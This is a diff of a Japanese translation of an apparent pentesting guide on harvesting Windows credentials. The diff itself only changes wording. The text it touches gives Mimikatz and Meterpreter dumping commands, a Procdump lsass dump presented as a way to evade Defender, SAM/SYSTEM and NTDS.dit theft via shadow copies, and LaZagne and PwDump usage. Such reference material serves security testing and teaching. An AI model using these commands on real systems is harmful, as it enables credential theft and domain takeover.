@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Meterpreterによる資格情報
 
-私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、** **被害者の内部でパスワードとハッシュを検索します。**
+私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)を使用して、**被害者の内部でパスワードとハッシュを検索**します。
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -45,12 +45,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## AVをバイパスする
+## AVのバイパス
 
 ### Procdump + Mimikatz
 
-**SysInternalsのProcdump**は**正当なMicrosoftツール**であるため、Defenderによって検出されません。\
-このツールを使用して、**lsassプロセスをダンプ**し、**ダンプをダウンロード**し、**ダンプからローカルに資格情報を抽出**できます。
+**SysInternalsの** [**Procdump**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正当なMicrosoftツール**であるため、Defenderによって検出されません。\
+このツールを使用して、**lsassプロセスをダンプ**し、**ダンプをダウンロード**し、**ダンプからローカルに** **資格情報を抽出**できます。
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -131,9 +131,9 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## SAM & SYSTEMの盗難
+## SAMとSYSTEMの盗難
 
-このファイルは**_C:\windows\system32\config\SAM_**と**_C:\windows\system32\config\SYSTEM._**に**存在する必要があります**。しかし、**通常の方法でコピーすることはできません**。なぜなら、これらは保護されているからです。
+このファイルは**_C:\windows\system32\config\SAM_**と**_C:\windows\system32\config\SYSTEM._**に**存在する必要があります**。しかし、**通常の方法でコピーすることはできません**。なぜなら、保護されているからです。
 
 ### レジストリから
 
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-しかし、**Powershell**を使っても同じことができます。これは**SAMファイルをコピーする方法**の例です（使用するハードドライブは"C:"で、C:\users\Publicに保存されます）が、これは保護されたファイルをコピーするために使用できます：
+しかし、**Powershell**を使って同じことができます。これは**SAMファイルをコピーする方法**の例です（使用するハードドライブは"C:"で、C:\users\Publicに保存されます）が、これは保護されたファイルをコピーするために使用できます：
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -194,7 +194,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 
 これに関する詳細情報: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windowsは_Ntdsa.dll_を使用してそのファイルと対話し、_lsass.exe_によって使用されます。次に、**NTDS.dit**ファイルの**一部**は**`lsass`**メモリ内に存在する可能性があります（**キャッシュ**を使用することによるパフォーマンス向上のために、最新のアクセスデータを見つけることができるかもしれません）。
+Windowsは_Ntdsa.dll_を使用してそのファイルと対話し、_lsass.exe_によって使用されます。次に、**NTDS.dit**ファイルの**一部**は**`lsass`**メモリ内に存在する可能性があります（パフォーマンス向上のために**キャッシュ**を使用して最新のアクセスデータを見つけることができます）。
 
 #### NTDS.dit内のハッシュの復号化
 
@@ -204,7 +204,7 @@ Windowsは_Ntdsa.dll_を使用してそのファイルと対話し、_lsass.exe_
 2. **PEK**と**RC4**を使用して**ハッシュ**を復号化します。
 3. **DES**を使用して**ハッシュ**を復号化します。
 
-**PEK**は**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内でドメインコントローラーの**SYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これが、NTDS.ditファイルから資格情報を取得するために**NTDS.ditとSYSTEMファイルが必要**な理由です（_C:\Windows\System32\config\SYSTEM_）。
+**PEK**は**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内では**ドメインコントローラーのSYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これが、NTDS.ditファイルから資格情報を取得するために**NTDS.ditとSYSTEMファイルが必要**な理由です（_C:\Windows\System32\config\SYSTEM_）。
 
 ### Ntdsutilを使用したNTDS.ditのコピー
 
@@ -234,11 +234,11 @@ NTDS オブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdot
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` ハイブはオプションですが、秘密の復号化を可能にします（NTおよびLMハッシュ、平文パスワード、Kerberosまたは信頼キー、NTおよびLMパスワード履歴などの補足資格情報）。他の情報とともに、以下のデータが抽出されます：ユーザーおよびマシンアカウントとそのハッシュ、UACフラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループおよび再帰的メンバーシップ、組織単位ツリーおよびメンバーシップ、信頼されたドメインと信頼の種類、方向および属性...
+`SYSTEM` ハイブはオプションですが、秘密の復号化を可能にします（NT & LM ハッシュ、平文パスワード、Kerberos または信頼キー、NT & LM パスワード履歴などの補足資格情報）。他の情報とともに、以下のデータが抽出されます：ハッシュを持つユーザーおよびマシンアカウント、UAC フラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループおよび再帰的メンバーシップ、組織単位ツリーおよびメンバーシップ、信頼されたドメインと信頼の種類、方向および属性...
 
 ## Lazagne
 
-バイナリを[こちら](https://github.com/AlessandroZ/LaZagne/releases)からダウンロードします。このバイナリを使用して、いくつかのソフトウェアから資格情報を抽出できます。
+バイナリを [こちら](https://github.com/AlessandroZ/LaZagne/releases) からダウンロードします。このバイナリを使用して、いくつかのソフトウェアから資格情報を抽出できます。
 ```
 lazagne.exe all
 ```
@@ -265,7 +265,7 @@ type outpwdump
 ```
 ### PwDump7
 
-ダウンロードはこちらから:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) そして **実行するだけで** パスワードが抽出されます。
+ダウンロードはこちらから: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) そして **実行するだけで** パスワードが抽出されます。
 
 ## Defenses
 
